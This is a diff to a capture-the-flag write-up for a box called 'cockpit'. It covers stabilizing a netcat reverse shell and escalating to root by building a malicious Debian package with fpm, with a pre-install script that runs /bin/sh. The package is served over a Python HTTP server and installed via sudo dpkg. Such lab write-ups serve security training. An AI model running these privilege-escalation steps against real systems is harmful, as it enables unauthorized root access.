@@ -80,13 +80,40 @@ Boom we get a connection on our listener.
 
 ## Post Exploitation
 Anytime we get a shell through netcat we obtain a dumb shell. A dump shell has very little functionality and therefore we need a stable shell. Shell Stabilization prevents you from killing your reverse shell and adds proper shell functionalities.
+
 #### Shell stabilization
 Execute on target
 1. Step 1: `python3 -c "import pty;pty.spawn('/bin/bash')"` <br>
 2. Step 2: `export TERM=xterm-color` <br>
-3. Step 3: `CTRL+z` <br>
+3. Step 3: `CTRL+z`
 On host machine.
 4. Step 4: `stty raw -echo; fg` <br>
 5. Step 5: `reset` <br>
 
+## Privilege Escalation
+We first check our privileges.
+`sudo -l`
+![PE vector](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/priv_escalation.png)
 
+Doing a search on for dpkg on [gtfobins](https://gtfobins.github.io/gtfobins/dpkg/#sudo)
+![gfobins](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/gtfobins_privesc.png)
+
+Now the way this is going to work is that we would build a malcious debian package and the we try installing the package which will run our malicious code embedded in the package.
+Steps to building malicious package.
+1. Install fpm: `sudo apt install ruby && sudo gem install fpm`
+2. Build package with fpm: ```TF=$(mktemp -d)
+echo 'exec /bin/sh' > $TF/x.sh
+fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF```
+![mal deb package](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/creating_mal_packgae.png)
+
+We now have our malicous package on our host and we can now transfer to our target.
+Start your python server: `python3 -m http.server 8000`
+![python transfer](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/python_server_for_mal_package.png)
+
+Download the malicous package on your target.
+NB: Make sure you are in a writable directory like `/tmp`.
+
+![python transfer download](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/downloading_mal_package_from_attacker_server.png)
+
+Now we can execute and get root access.
+![iamroot](https://github.com/theMcSam/brCTF-writeups/blob/main/cockpit/images/i_am_root.png)
